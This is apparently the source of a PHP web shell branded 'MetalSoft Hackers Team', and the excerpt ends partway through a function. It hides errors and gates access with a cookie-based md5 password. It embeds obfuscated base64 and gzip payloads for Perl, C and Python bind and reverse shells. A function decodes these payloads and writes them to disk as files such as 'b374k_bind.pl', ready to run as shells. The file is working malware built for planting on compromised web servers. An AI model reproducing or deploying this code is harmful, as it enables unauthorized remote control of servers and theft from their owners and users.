<?php

// MetalSoftHackersTeam
// Jayalah Indonesiaku

error_reporting(0);
@set_time_limit(0); 


$s_name = "MetalSoft Hackers Team"; // Nombre de la shell
$s_ver = "1.1"; // Version de la shell
$s_title = $s_name." ".$s_ver; // Titulo de la shell
$s_pass = "d9ae3f29b7765b499485e924d3fe10e9"; // password (oficial passwd: metalsoft)

$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['MetalSoftTeam'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['MetalSoftTeam']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$login = strtolower(trim($_REQUEST['login']));
		if(strtolower(trim($s_pass)) == md5($login)){
			setcookie("MetalSoftTeam",md5($login),time() + 3600*24*7);
			$m = $_SERVER['SCRIPT_NAME'];
			header("Location: ".$m);
			die();
		}
		else{
			setcookie("MetalSoftTeam",$login,time() - 3600*24*7);
			$m = $_SERVER['SCRIPT_NAME'];
			header("Location: ".$m);
			die();
		}
	}
}
else $s_auth = true; // $s_pass variable (password) is empty , go ahead, no login page


// resources $xback_pl $xbind_pl $xback_c $xbind_c $xmulti_py $wmulti_c... this was used with bind and reverse shell
// use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
$xback_pl ="dZFfT4MwFMXf+RQVmSvJEuYzqcmCaJZlYwH0xT+EwVUbR0vaLmZx87PblqnEbG/33HPOL7dwfhZspAhWlAUtiLWzkYAyXr2DCh2PS0SQ95zoUW6lgoa4Ninf3NChL9gGvlATfOgl9T/Rb2wQJfNsGUcDFMzccO94Y+JVTa1BqhSvoIg3SW/vHy6f9Kbl4kePjaZlXQtCGaiiVJzhQ8VHux2qKWAXhODikbm+Kduw1BeboaA6bngj1GFOlARXnGimHVZbVjaAh6pqh9qV9vU4S6JZnI/Q8qaYLsxgFkWWp/Fkrum2eZReccag+gN0Jx6N8hYYzvLr6WKE3KuLrtE3krv8hBOn6T+n+/T48AvMIWsuocP3lWb2pQZp+Q0=";
$xbind_pl ="bZFvS8MwEMbf51PcYre1UKjiy1pxdFXHtnY0VRD/lNneNFiT0maozPnZTYpTEd+F537P5e65vZ63bhvvnguvxqYilmwhAOsu8YnFzqPZLKBdsX2kPuEru6t/wLP3okXubGBH9cNkzhZR2AdvSv2tZsE+GaVnl3AEBw5sAF+5sg8cH7bEmk1YFsX5IkmzwDLQ9f6tT9YtApPFEyr9ed1IJQtZBQ+ouvf9m1g+oz1URT10fNJ2oM3cweI0n8RR5g5YEk5zlqXRaO5++x14f4eSo02xaWRzI6gxozJ+WZsGLJnlxqpbsCRPowsWjcbj1NWzEr16qREDL8uyybmwfw/vTmKD5qP4yvn3o4q3CoXucLgrA9VBvjzyCnUYZEOWRYF6jDCJY5c5XcY926p5Gaxk8+QYpHOFSyGkAiNSMOH2SlxxgSUYWBtljQJYNp7ELj0amH70R0wuMpce/1WjNP2l4isWX+f8b5Wikvo+hjUoV7Dvky3ZfgI=";
$xback_c = "XVFNawIxEL0L/odhhZJocF2v2oKIBSmtontrZVmTbDd0TSSJxQ/8702y1loPSWbmvXkzvLSEpNWOcRgay4Tqlk/NRuuvdjCxUfSL2ztAcivciYUMgJAWNrmQyAe5/qQEaJlraLv4+32FTzWlYINmw1i9oxa8bM6YzoQEI6QDWM43SqKE9LCnOWl3siLfiOoAjzB6zqZvk/QG2iptHVBaJQ3KrRIojEtW+FbAD+ma8Diy3zrENbe/8tT1kWv1WyBuwYrLK95JOreVi3rBnFhtDbpsRmA5G79ky3QxGb0SmM7ni1k6y9LxHIPrEAUgRJWUnFpUMALozgloY3hwGxPnx5Gr4h7HGA97+LTlWiuNovB8yAgP+F5Y5Ew7Ow93234QDx5es+Rf1vcZ33NaoSheCxmbMiKRv1D9azh000oZ7hp8fP4B";
$xbind_c = "dVJhS+QwEP0u+B9yFW6Ttex2BT/1erCcCiK3B+oXUSkxSe1gNylJVl0W//tNmha0KrRJ5r2XzMtMDkCLZiMV+eW8BDOrf+/vHbzDLOjHMbh1c79tlfsCd0Y8KT8itPKA/xz0iFDW6pgStCdrDppy+yhSHJ5ZBEOc7++JmlsynQYi30UmpKpkSrR6qSRK0OtGRJhLaUvQxKq18Qo5qGhl7BNlpChIxggeEbmZA11WfA3NlhRkeVaer06v8w9sa6xHrvZGO8q9geDx+XZxz9hHYcg6c93U6xt6vlqenFyWy9VNEEfLSMYy0T5fevXvz0V5dX15uvybZiz6/RHFjLRYJWNp0k13Ogn8A2hJ+wLQ0cXJlP2MrlKSvS668xpwXulhx3GAXmpoFF0wLEVXwYILoVo/aLJoRG7aI9rxn+LFKD4KsXpVoqHJHA3OXZ2kSRho7B7rThCNcSpuCeHb8IWWirrlzvXyB+7wBnGttFdWSda3HnAj9pNCkeUQHmmDlxs0ORwe4uPZdVXswVu4D52f3OkJUu9BxLJJ/qXWfqcNbiuCHfJWrFvaGR2ys/Ak/MZqkgXlfw==";
$xmulti_py = "lVNda9swFH22wf9B9R4qk9T56PYS0CCMlJYlzWgyGHQjuLZSizqSkZS2+ffVvbKb0GSM5SHWx9E5514dfTrrbY3uPQjZ4/KZ1DtbKhmFYlMrbYkyXWJ28KfyJ267xIoNj8LZ+NdqOrllg/7wcxQurifTKYuR4yEzJbnI4yhc3swmq/nPJbvs96Pwx/xuyWK3fD1f+EHB18SUvKpovimSURQGplyprWXKpLWquaTI24lJ3AFEqnlWVEJyQxMHlg0aqIK10kQQIYnO5COnlTvstxMkbsEd5r/34o9b1dxutSTNnjeU5VYoSXMlJZ58KUXFyVJvOfJYvcNvUDtHDFDOVf5Mm36Ar4C/5ry2DUwLaWnMtVb6t4xxv9UFUsRXxpMHwInlBKcKAsnkYuALQnCHwZovxv3EmgADi0dFHjeoj2Igt8eZ4iPuKnNuWmDrC6nBAjj42m8XA2j//gbbVeyK4bKg0P8ozPTjM3MZSmHgguWpYJIwNgQyzAYs3A9cKWjwAHJ5DAkwRDgd4gnnlPBXYekgaaIGfYdBgoouUq6jTzQ5Y2gf7CC+7/Yh2sznO/Uf2szGV6ub28myTX+6mH/7vlos7ybjWXPOFWrhSbhSaRv45GSRiHYvpKD0vFJ5VpXK2PMuQZNJC6iEse4g2NJbyfy1+RC6OfCcaA7GEj2m0HyeW0qhQwfk/04lVJGaivOafknecwmqrHkUIAA778EA2QDfSjcrCp1gE9MsByX636qD06r4FI/qHo6Iz1m5tYV6kXR45Iw09+M6HseHbshfRD1+T/gG";
$wmulti_c = "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";
$favicon = "AQYD+fyJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAAEZ0FNQQAAr8g3BYrpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAphJREFUOMudk8lPU1EUxvkbXAMdXlug2Kp0eu8ViiUIC2wZJJYqkwUqFiqUMjqgAQppUnAIiBKmFoq0thYKBI0GBGMw0ejGxIVLdyYmYDQ0xPD5HokopmXh4kvuyb3nd853ck8cgLhYylymkblIadlzxmNVUXpAuf3vmwOB9pma+DvWhElkhFRhy4Cer/YpaugZ+bdDASfZiktU8+84PaiKqP3Kr+YbOd6CXnqbHpPtltjUzpgAzQK5mTFPRvZaDpBb9KwClFcOyi1H53oT1j+H0O6qgK4mrSUqgPGpTX+khMZHbuYFTiH4YRxPPk5j4KUDklvJqFjOh//1ME70H8VxZyqkDjFTdZ7cYnzue2d87mZ6Kcy+u42epyZcDZegNVwJzTAJiTMFpmkDsgtEn/Y7YHzuMD5BP1R4NF7yy9lgAbxv+3FzqRz2YD7KprJg9BfC92YEQ6sDkHanQG0Uhg5YoKblG6RbBnJchsD7QXQulqIpoEeZWwvDjB731xywzxrwYKUXkk4xxB2i7ymtQuuBGZCjsojRVwTXcysa/TqUTmSh2HMa91a7YZ0qRNVYLgNwQtwmQrJdsJvUSEBUz/8zQNVQ2o/aoAl3VtpQNpmNMxN5cC22w+LRwzSaC8e8DQ2TFiTZBEiuJ46wOYSZe20fQN9V9KW5JOhaakPxuA6uhQ5Y3DpUjuSgZ84G6roSostM1TqiOuY/kPUdWyOauRh7MYiuUD0uMqCeuUZcmWmBsI4PQS0PRA03wjdxmqMCWEmvitekHWI0uGth99RBahPvJQrNvGomUcurSNzkliaAcy6eiApglWoXuZOs/J+CS0xFMxf8Ks6rWAsXd9g2suJf4GzwyhPBPZ9A/BeAFccYv5NoiN+KdvcLtyxxEwhxgvoAAAAASUVORK5CYII=";
$style = "tVbbitswEP0VwVJoYR18SdNd52kp9AtKX4tsybFYWTKysknW9N9ryVI0sZ3sFrbWS+KM5nLOmZkUkpx6VODyeafkXpD8LrbPFlVS6KhjrzRPkvbovle4YfyU/8S1bPD9L6oIFvj+STHMt6iUXKr8rqqqLfqD7hrMxKXrxD5b1GJCmNjlaXtED8Z31MjXqJCKUBUpTNi+y1ESm18WXx4Y0XWexPEnG6imeLDpUYPVjok8DgGGj5oedYQ524mc00qDC0iTK3eCSZ30AIjURgeG4XZ0oMUz05FWWHSVVE2OlNRY089Rkq2yb4Tuvrg6b5vA2Aj3AFSHa3i3/v6QPf1wJRJaSoU1kyIXUlBjuTKOmKhk72E0COQDm6iTnBF09uDq2MDyDDnxcBL71nnTBe8n8Pv3HdIDBzVlu1rn6dpceqFKsxJzh3/DCOFjZjt8wvdo9WJom1Rj4T6MbgrJibW3hh+GMadaD2h0LS5dpaNgqdgvC9bzjAwoQ2nIXVmZKw1D/Rm1tZd0kMaEQeg/fTRn+z5Cl7L+MEiWOnC90IDri8LzWlpmYE3Zxpxbqb2d2UU/rJho9/p1kEurZNPq4QN9wbyUhC6zNaYMezoFlRRSa9nALsgezZlPvFnruQT6ZY2GpGCDuIbIUtqAYoq97mfxLmp5NGemjLMQATewlNQ+YzrHdrg6yQbKNIZmZqxcnSPexgzMqyj60OfxOPYBZ4JGt6aClu1lkDp0U+a7CQIuBqWYdXPRSLO6h2m0pM7kwRxr2NGm2IsT6xFhXcvxyRUc5nvo4WE6KNrt+cDaP+6qOUeey9nIgFCNU3dJ3U4RGGMgBwv2yGhrOJ+QYKRbt2YVII0LfkUUifExZg0vkP5WHqV9gpONq2b7tlJgkPreEr9E1WKz+Yt12sMVr4zVRSd/BcM4i91OiyfQluYAICwGk3m7meBiIl8t0XMM7MPe9pCZvcbooWJTQgCtrlHfg6X3ZRmDW3x9c/p5D1e6xHstB0ip0MGzmVlndTWnQh7/Q28k031q8QhiHwNbLhb+yQXL60TZJ7ha+oOjut+++YPr5PZOAX4rKbUZQ3OZAm+b85QbZbukwBQspcD7Xw==";
// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable
$sortable_js = "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";

// make link for folder $pwd and all of its parent folder
function swd($p){
	$ps = explode(DIRECTORY_SEPARATOR,$p);
	$pu = "";
	for($i = 0 ; $i < sizeof($ps)-1 ; $i++){
		$pz = "";
		for($j = 0 ; $j <= $i ; $j++) $pz .= $ps[$j].DIRECTORY_SEPARATOR;
		$pu .= "<a href=\"?d=".$pz."\">".$ps[$i]." ".DIRECTORY_SEPARATOR." </a>";
	}
	return trim($pu);
}
// remove <br />tags
function rp($t){
	return trim(str_replace("<br />","",$t));
}
// replace spaces with underscore ( _ )
function cs($t){
	return str_replace(" ","_",$t);
}
// strip slashes,trim and urldecode
function ss($t){
	if (!get_magic_quotes_gpc()) return trim(urldecode($t));
	return trim(urldecode(stripslashes($t)));
}
// only strip slashes
function ssc($t){
	if (!get_magic_quotes_gpc()) return $t;
	return stripslashes($t);
}
// bind and reverse shell
function rs($s_win, $d, $type, $sc, $target){
	$result = "";

	$fc = gzinflate(base64_decode($sc));

	$errperm = "<p class=\"rs_result\">error: permission denied. check current working directory permissions</p>";
	$errgcc = "<p class=\"rs_result\">error: can not compile using gcc</p>";

	if($type == "xbind_pl"){
		$fname = "b374k_bind.pl";
		$fpath = $d.$fname;
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
